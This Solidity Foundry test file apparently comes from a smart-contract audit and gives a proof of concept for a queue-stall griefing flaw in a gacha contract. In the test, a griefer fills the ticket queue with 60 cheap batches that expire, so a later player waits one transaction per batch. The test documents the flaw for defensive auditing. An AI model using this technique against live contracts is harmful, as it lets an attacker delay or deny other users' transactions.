// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import {console2} from "forge-std/console2.sol";
import {stdStorage, StdStorage} from "forge-std/StdStorage.sol";
import {FinalAuditBase} from "../final/FinalAuditBase.sol";

contract R3DCol {
    uint256 public totalMinted;
    uint256 public maxSupply = 100_000;

    function mint(address) external returns (uint256 id) {
        totalMinted += 1;
        id = totalMinted;
    }

    fallback() external {}
}

/// @notice R3D — head-of-line stall. `GachaLib.resolveTickets` re-stamps an
///         expired batch and then BREAKS, so one call clears at most one aged
///         batch. A stranger who fills the FIFO with N cheap batches and lets
///         them expire forces N separate transactions (N blocks) before a later
///         player's crystal can roll at all.
contract R3D_AgedQueueStall is FinalAuditBase {
    using stdStorage for StdStorage;

    R3DCol internal col;
    address internal griefer = address(0x6717F);
    address internal victimP = address(0x1C717);

    function setUp() public {
        _deployOffchain(address(0xBEEF));
        col = new R3DCol();
        vm.prank(address(registry));
        hook.setCollection(address(col));
        hook.setOpener(address(this), true);
        uint256 e = hook.creditEpoch();
        stdstore.target(address(hook)).sig("nftCredit(uint256,address)").with_key(e).with_key(griefer)
            .checked_write(uint256(100_000 ether));
        stdstore.target(address(hook)).sig("nftCredit(uint256,address)").with_key(e).with_key(victimP)
            .checked_write(uint256(100_000 ether));
    }

    /// @dev Fill the queue with `n` single-crystal batches from the griefer,
    ///      then one victim batch, let every seed expire, and count how many
    ///      resolve calls the victim must wait for.
    function _stall(uint256 n) internal returns (uint256 calls, uint256 victimPending) {
        for (uint256 i = 0; i < n; ++i) {
            hook.commitCrystals(griefer, 1, 1 ether);
            vm.roll(vm.getBlockNumber() + 1);
        }
        hook.commitCrystals(victimP, 1, 1 ether);
        // Nobody resolves for the whole blockhash window.
        vm.roll(vm.getBlockNumber() + 300);
        for (uint256 k = 0; k < 4000; ++k) {
            (uint256 pr,) = hook.resolveTickets(30);
            if (k < 8) { (,, uint48 hcb,,,) = hook.batches(0); console2.log("call", k); console2.log("  processed", pr); console2.log("  blk", vm.getBlockNumber()); console2.log("  head cb", hcb); console2.log("  outstanding", hook.outstandingTickets()); }
            calls += 1;
            vm.roll(vm.getBlockNumber() + 1);
            if (hook.pendingOf(victimP) == 0) break;
        }
        victimPending = hook.pendingOf(victimP);
    }

    function test_R3D_ExpiredQueueCostsOneCallPerBatch() public {
        uint256 n = 60;
        (uint256 calls, uint256 victimPending) = _stall(n);

        console2.log("batches ahead", n);
        console2.log("resolve calls the victim waited for", calls);
        console2.log("victim pending after", victimPending);

        assertEq(victimPending, 0, "the queue does eventually drain (liveness holds)");
        // The grief: linear in the number of expired batches ahead, not O(1).
        assertGt(calls, n, "one transaction per expired batch, not one batch per transaction");
    }
}
